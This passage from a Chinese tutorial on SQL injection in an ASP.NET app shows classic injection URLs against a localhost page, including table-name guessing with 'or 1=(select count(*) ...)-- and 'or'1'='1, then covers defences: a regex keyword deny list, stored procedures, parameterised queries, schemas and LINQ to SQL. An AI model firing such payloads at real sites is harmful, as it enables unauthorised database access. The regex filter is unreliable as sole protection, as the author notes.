+<p><a href="http://localhost:3452/ExcelUsingXSLT/Default.aspx?jobid=1%27or%201=(select%20count(*)%20from%20job)--" target="_blank">http://localhost:3452/ExcelUsingXSLT/Default.aspx?jobid=1'or 1=(select count(*) from job)--</a></p>
+
+<p> </p>
+
+<p>等效SQL语句如下：</p>
+
+<p> </p>
+
+<pre>
+SELECT job_id, job_desc, min_lvl, max_lvl 
+FROM jobs 
+WHERE job_id='1'or 1=(select count(*) from job) --'</pre>
+
+<p> </p>
+
+<p> </p>
+
+<p><a href="http://images.cnblogs.com/cnblogs_com/rush/201201/201201010828077269.png" target="_blank"><img alt="sqlinjection8" src="http://images.cnblogs.com/cnblogs_com/rush/201201/201201010828089122.png" style="height:284px; width:695px" title="sqlinjection8" /></a></p>
+
+<p>图4 job表查询结果</p>
+
+<p> </p>
+
+<p>当我们输入了以上URL后，结果服务器返回我们错误信息，这证明了我们的假设是错误的，那我们该感觉到挫败吗？不，其实这里返回了很多信息，首先它证明了该表名不是job，而且它还告诉我们后台数据库是SQL Server，不是MySQL或Oracle，这也设计一个漏洞把错误信息直接返回给了用户。</p>
+
+<p>接下假定表名是jobs，然后输入以下URL：</p>
+
+<p><a href="http://localhost:3452/ExcelUsingXSLT/Default.aspx?jobid=1%27or1=(select%20count(*)%20from%20jobs)%20--" target="_blank">http://localhost:3452/ExcelUsingXSLT/Default.aspx?jobid=1'or1=(select count(*) from jobs) --</a></p>
+
+<p> </p>
+
+<p>等效SQL语句如下：</p>
+
+<p> </p>
+
+<pre>
+SELECT job_id, job_desc, min_lvl, max_lvl 
+FROM jobs 
+WHERE job_id='1'or 1=(select count(*) from jobs) --'</pre>
+
+<p> </p>
+
+<p><a href="http://images.cnblogs.com/cnblogs_com/rush/201201/20120101082808135.png" target="_blank"><img alt="sqlinjection" src="http://images.cnblogs.com/cnblogs_com/rush/201201/201201010828095925.png" style="height:262px; width:617px" title="sqlinjection" /></a></p>
+
+<p>图5 job表查询结果</p>
+
+<p> </p>
+
+<p>现在证明了该表名是jobs，这可以迈向成功的一大步，由于我们知道了表名就可以对该表进行增删改操作了，而且我们还可以猜测出更多的表对它们作出修改，一旦修改成功那么这将是一场灾难。</p>
+
+<p>现在大家已经对SQL Injection的攻击有了初步的了解了，接下让我们学习如何防止SQL Injection。</p>
+
+<p>总的来说有以下几点：</p>
+
+<blockquote>
+<p>1.永远不要信任用户的输入，要对用户的输入进行校验，可以通过正则表达式，或限制长度，对单引号和双"-"进行转换等。</p>
+
+<p>2.永远不要使用动态拼装SQL，可以使用参数化的SQL或者直接使用存储过程进行数据查询存取。</p>
+
+<p>3.永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。</p>
+
+<p>4.不要把机密信息明文存放，请加密或者hash掉密码和敏感的信息。</p>
+
+<p>5.应用的异常信息应该给出尽可能少的提示，最好使用自定义的错误信息对原始错误信息进行包装，把异常信息存放在独立的表中。</p>
+
+<p> </p>
+</blockquote>
+
+<h2>通过正则表达校验用户输入</h2>
+
+<p>首先我们可以通过正则表达式校验用户输入数据中是包含：对单引号和双"-"进行转换等字符。</p>
+
+<p>然后继续校验输入数据中是否包含SQL语句的保留字，如：WHERE，EXEC，DROP等。</p>
+
+<p>现在让我们编写正则表达式来校验用户的输入吧，正则表达式定义如下：</p>
+
+<p> </p>
+
+<pre>
+private static readonly Regex RegSystemThreats =
+new Regex(@"\s?or\s*|\s?;\s?|\s?drop\s|\s?grant\s|^'|\s?--|\s?union\s|\s?delete\s|\s?truncate\s|" +
+@"\s?sysobjects\s?|\s?xp_.*?|\s?syslogins\s?|\s?sysremote\s?|\s?sysusers\s?|\s?sysxlogins\s?|\s?sysdatabases\s?|\s?aspnet_.*?|\s?exec\s?",
+RegexOptions.Compiled | RegexOptions.IgnoreCase);</pre>
+
+<p>上面我们定义了一个正则表达式对象RegSystemThreats，并且给它传递了校验用户输入的正则表达式。</p>
+
+<p>由于我们已经完成了对用户输入校验的正则表达式了，接下来就是通过该正则表达式来校验用户输入是否合法了，由于.NET已经帮我们实现了判断字符串是否匹配正则表达式的方法——IsMatch()，所以我们这里只需给传递要匹配的字符串就OK了。</p>
+
+<p>示意代码如下：</p>
+
+<p> </p>
+
+<pre>
+/// <summary>
+/// A helper method to attempt to discover [known] SqlInjection attacks. 
+/// </summary>
+/// <param name="whereClause">string of the whereClause to check</param>
+/// <returns>true if found, false if not found </returns>
+public static bool DetectSqlInjection(string whereClause)
+{
+return RegSystemThreats.IsMatch(whereClause);
+}
+
+/// <summary>
+/// A helper method to attempt to discover [known] SqlInjection attacks. 
+/// </summary>
+/// <param name="whereClause">string of the whereClause to check</param>
+/// <param name="orderBy">string of the orderBy clause to check</param>
+/// <returns>true if found, false if not found </returns>
+public static bool DetectSqlInjection(string whereClause, string orderBy)
+{
+return RegSystemThreats.IsMatch(whereClause) || RegSystemThreats.IsMatch(orderBy);
+}</pre>
+
+<p> </p>
+
+<p>现在我们完成了校验用的正则表达式，接下来让我们需要在页面中添加校验功能。</p>
+
+<pre>
+/// <summary>
+/// Handles the Load event of the Page control.
+/// </summary>
+/// <param name="sender">The source of the event.</param>
+/// <param name="e">The <see cref="System.EventArgs"/> instance containing the event data.</param>
+protected void Page_Load(object sender, EventArgs e)
+{
+if (!IsPostBack)
+{
+// Gets departmentId from http request.
+string queryString = Request.QueryString["jobId"];
+if (!string.IsNullOrEmpty(queryString))
+{
+if (!DetectSqlInjection(queryString) && !DetectSqlInjection(queryString, queryString))
+{
+// Gets data from database.
+gdvData.DataSource = GetData(queryString.Trim());
+
+// Binds data to gridview.
+gdvData.DataBind();
+}
+else
+{
+throw new Exception("Please enter correct field");
+}
+}
+}
+}</pre>
+
+<p> </p>
+
+<p>当我们再次执行以下URL时，被嵌入的恶意语句被校验出来了，从而在一定程度上防止了SQL Injection。</p>
+
+<p><a href="http://localhost:3452/ExcelUsingXSLT/Default.aspx?jobid=1%27or%271%27=%271" target="_blank">http://localhost:3452/ExcelUsingXSLT/Default.aspx?jobid=1'or'1'='1</a></p>
+
+<p> </p>
+
+<p><a href="http://images.cnblogs.com/cnblogs_com/rush/201201/201201010828118235.png" target="_blank"><img alt="sqlinjection9" src="http://images.cnblogs.com/cnblogs_com/rush/201201/20120101082812644.png" style="height:252px; width:693px" title="sqlinjection9" /></a></p>
+
+<p>图6 添加校验查询结果</p>
+
+<p> </p>
+
+<p>但使用正则表达式只能防范一些常见或已知SQL Injection方式，而且每当发现有新的攻击方式时，都要对正则表达式进行修改，这可是吃力不讨好的工作。</p>
+
+<p> </p>
+
+<h2>通过参数化存储过程进行数据查询存取</h2>
+
+<p>首先我们定义一个存储过程根据jobId来查找jobs表中的数据。</p>
+
+<p> </p>
+
+<pre>
+-- =============================================
+-- Author: JKhuang
+-- Create date: 12/31/2011
+-- Description: Get data from jobs table by specified jobId.
+-- =============================================
+ALTER PROCEDURE [dbo].[GetJobs]
+-- ensure that the id type is int
+@jobId INT
+AS
+BEGIN
+-- SET NOCOUNT ON;
+SELECT job_id, job_desc, min_lvl, max_lvl
+FROM dbo.jobs
+WHERE job_id = @jobId
+GRANT EXECUTE ON GetJobs TO pubs 
+END</pre>
+
+<p> </p>
+
+<p>接着修改我们的Web程序使用参数化的存储过程进行数据查询。</p>
+
+<p> </p>
+
+<pre>
+using (var com = new SqlCommand("GetJobs", con))
+{
+// Uses store procedure.
+com.CommandType = CommandType.StoredProcedure;
+
+// Pass jobId to store procedure.
+com.Parameters.Add("@jobId", SqlDbType.Int).Value = jobId;
+com.Connection.Open();
+gdvData.DataSource = com.ExecuteScalar();
+gdvData.DataBind(); 
+}</pre>
+
+<p> </p>
+
+<p>现在我们通过参数化存储过程进行数据库查询，这里我们把之前添加的正则表达式校验注释掉。</p>
+
+<p> </p>
+
+<p><a href="http://images.cnblogs.com/cnblogs_com/rush/201202/20120229212037267.png" target="_blank"><img alt="sqlinjection10" src="http://images.cnblogs.com/cnblogs_com/rush/201202/201202292120449258.png" style="height:253px; width:693px" title="sqlinjection10" /></a></p>
+
+<p>图7 存储过程查询结果</p>
+
+<p> </p>
+
+<p>大家看到当我们试图在URL中嵌入恶意的SQL语句时，参数化存储过程已经帮我们校验出传递给数据库的变量不是整形，而且使用存储过程的好处是我们还可以很方便地控制用户权限，我们可以给用户分配只读或可读写权限。</p>
+
+<p>但我们想想真的有必要每个数据库操作都定义成存储过程吗？而且那么多的存储过程也不利于日常的维护。</p>
+
+<p> </p>
+
+<h2>参数化SQL语句</h2>
+
+<p>还是回到之前动态拼接SQL基础上，我们知道一旦有恶意SQL代码传递过来，而且被拼接到SQL语句中就会被数据库执行，那么我们是否可以在拼接之前进行判断呢？——命名SQL参数。</p>
+
+<p> </p>
+
+<pre>
+string sql1 = string.Format("SELECT job_id, job_desc, min_lvl, max_lvl FROM jobs WHERE job_id = @jobId");
+using (var con = new SqlConnection(ConfigurationManager.ConnectionStrings["SQLCONN1"].ToString()))
+using (var com = new SqlCommand(sql1, con))
+{
+// Pass jobId to sql statement.
+com.Parameters.Add("@jobId", SqlDbType.Int).Value = jobId;
+com.Connection.Open();
+gdvData.DataSource = com.ExecuteReader();
+gdvData.DataBind(); 
+}</pre>
+
+<p><a href="http://images.cnblogs.com/cnblogs_com/rush/201202/201202292120537221.png" target="_blank"><img alt="sqlinjection10" src="http://images.cnblogs.com/cnblogs_com/rush/201202/201202292120555038.png" style="height:253px; width:693px" title="sqlinjection10" /></a></p>
+
+<p>图8 参数化SQL查询结果</p>
+
+<p>这样我们就可以避免每个数据库操作（尤其一些简单数据库操作）都编写存储过程了，而且当用户具有数据库中jobs表的读权限才可以执行该SQL语句。</p>
+
+<p> </p>
+
+<h2>添加新架构</h2>
+
+<p>数据库架构是一个独立于数据库用户的非重复命名空间，您可以将架构视为对象的容器（类似于.NET中的命名空间）。</p>
+
+<p>首先我们右击架构文件夹，然后新建架构。</p>
+
+<p> </p>
+
+<p><a href="http://images.cnblogs.com/cnblogs_com/rush/201201/201201010828189668.jpg" target="_blank"><img alt="clip_image002" src="http://images.cnblogs.com/cnblogs_com/rush/201201/201201010828192426.jpg" style="height:267px; width:238px" title="clip_image002" /></a></p>
+
+<p><a href="http://images.cnblogs.com/cnblogs_com/rush/201201/201201010828207310.png" target="_blank"><img alt="sqlinjection12" src="http://images.cnblogs.com/cnblogs_com/rush/201201/201201010828207768.png" style="height:183px; width:512px" title="sqlinjection12" /></a></p>
+
+<p>图9 添加HumanResource架构</p>
+
+<p> </p>
+
+<p>上面我们完成了在pubs数据库中添加HumanResource架构，接着把jobs表放到HumanResource架构中。</p>
+
+<p> </p>
+
+<p><a href="http://images.cnblogs.com/cnblogs_com/rush/201201/201201010828217178.png" target="_blank"><img alt="sqlinjection15" src="http://images.cnblogs.com/cnblogs_com/rush/201201/201201010828228192.png" style="height:146px; width:320px" title="sqlinjection15" /></a></p>
+
+<p><a href="http://images.cnblogs.com/cnblogs_com/rush/201201/201201010828225094.png" target="_blank"><img alt="sqlinjection13" src="http://images.cnblogs.com/cnblogs_com/rush/201201/201201010828231997.png" style="height:325px; width:256px" title="sqlinjection13" /></a></p>
+
+<p>图 10 修改jobs表所属的架构</p>
+
+<p> </p>
+
+<p>当我们再次执行以下SQL语句时，SQL Server提示jobs无效，这是究竟什么原因呢？之前还运行的好好的。</p>
+
+<p> </p>
+
+<pre>
+SELECT job_id, job_desc, min_lvl, max_lvl FROM jobs</pre>
+
+<p> </p>
+
+<p><a href="http://images.cnblogs.com/cnblogs_com/rush/201201/201201010828236075.png" target="_blank"><img alt="sqlinjection14" src="http://images.cnblogs.com/cnblogs_com/rush/201201/201201010828246566.png" style="height:200px; width:489px" title="sqlinjection14" /></a></p>
+
+<p>图 11 查询输出</p>
+
+<p> </p>
+
+<p>当我们输入完整的表名“架构名.对象名”（HumanResource.jobs）时，SQL语句执行成功。</p>
+
+<pre>
+SELECT job_id, job_desc, min_lvl, max_lvl FROM HumanResource.jobs</pre>
+
+<p> </p>
+
+<p><a href="http://images.cnblogs.com/cnblogs_com/rush/201201/201201010828247372.png" target="_blank"><img alt="sqlinjection16" src="http://images.cnblogs.com/cnblogs_com/rush/201201/201201010828251450.png" style="height:172px; width:586px" title="sqlinjection16" /></a></p>
+
+<p> </p>
+
+<p>为什么之前我们执行SQL语句时不用输入完整表名dbo.jobs也可以执行呢？</p>
+
+<p>这是因为默认的架构（default schema）是dbo，当只输入表名时，Sql Server会自动加上当前登录用户的默认的架构（default schema）——dbo。</p>
+
+<p>由于我们使用自定义架构，这也降低了数据库表名被猜测出来的可能性。</p>
+
+<p> </p>
+
+<h2>LINQ to SQL</h2>
+
+<p>前面使用了存储过程和参数化查询，这两种方法都是非常常用的，而针对于.NET Framework的ORM框架也有很多，如：NHibernate，Castle和Entity Framework，这里我们使用比较简单LINQ to SQL。</p>
+
+<p> </p>
+
+<p><a href="http://images.cnblogs.com/cnblogs_com/rush/201201/201201010828255321.png" target="_blank"><img alt="sqlinjection17" src="http://images.cnblogs.com/cnblogs_com/rush/201201/201201010828269158.png" style="height:184px; width:238px" title="sqlinjection17" /></a></p>
+
+<p>图 12 添加jobs.dbml文件</p>
+
+<p> </p>
+
+<pre>
+var dc = new pubsDataContext();
+int result;
+
+// Validates jobId is int or not.
+if (int.TryParse(jobId, out result))
+{
+gdvData.DataSource = dc.jobs.Where(p => p.job_id == result);
+gdvData.DataBind();
+}</pre>
+
+<p> </p>
+
+<p>相比存储过程和参数化查询，LINQ to SQL我们只需添加jobs.dbml，然后使用LINQ对表进行查询就OK了。</p>
+
+<p> </p>
+
+<h3>1.1.3 总结</h3>
+
+<p>我们在本文中介绍了SQL Injection的基本原理，通过介绍什么是SQL Injection，怎样进行SQL Injection和如何防范SQL Injection。通过一些程序源码对SQL的攻击进行了细致的分析，使我们对SQL Injection机理有了一个深入的认识，作为一名Web应用开发人员，一定不要盲目相信用户的输入，而要对用户输入的数据进行严格的校验处理，否则的话，SQL Injection将会不期而至。</p>
+
+<p>最后，祝大家新年快乐，身体健康，Code with pleasure。 </p>
